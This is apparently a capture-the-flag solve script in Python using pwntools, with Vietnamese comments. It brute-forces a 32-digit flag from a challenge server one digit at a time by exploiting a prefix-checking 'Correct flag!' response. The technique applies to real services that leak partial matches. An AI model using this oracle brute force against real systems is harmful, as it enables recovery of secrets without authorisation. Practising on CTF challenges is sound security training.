from pwn import *
import string

# Cấu hình kết nối
host = "chall.polygl0ts.ch"
port = 6001

def solve():
    known_flag = ""
    
    print("[-] Bắt đầu dò tìm Flag...")

    # Flag dài 32 ký tự số
    while len(known_flag) < 32:
        found_digit = False
        
        # Thử các số từ 0 đến 9
        for digit in string.digits:
            try:
                # Tạo kết nối mới cho mỗi lần đoán
                # level='error' để tắt log kết nối rác
                r = remote(host, port, level='error')
                
                # Đọc dòng banner ban đầu ("Don't even think...")
                r.recvline()
                
                # Tạo payload thử nghiệm
                guess = known_flag + digit
                r.sendline(guess.encode())
                
                # Nhận phản hồi
                response = r.recvall(timeout=1).decode()
                r.close()
                
                # Kiểm tra xem server bảo đúng hay sai
                if "Correct flag!" in response:
                    known_flag += digit
                    print(f"[+] Tìm thấy ký tự thứ {len(known_flag)}: {digit} | Flag hiện tại: {known_flag}")
                    found_digit = True
                    break
            except Exception as e:
                print(f"[!] Lỗi kết nối: {e}")
                r.close()
        
        if not found_digit:
            print("[!] Không tìm thấy số phù hợp. Có thể đã hết flag hoặc lỗi server.")
            break

    print(f"\n[SUCCESS] Full Flag: EPFL{{{known_flag}}}")

if __name__ == "__main__":
    solve()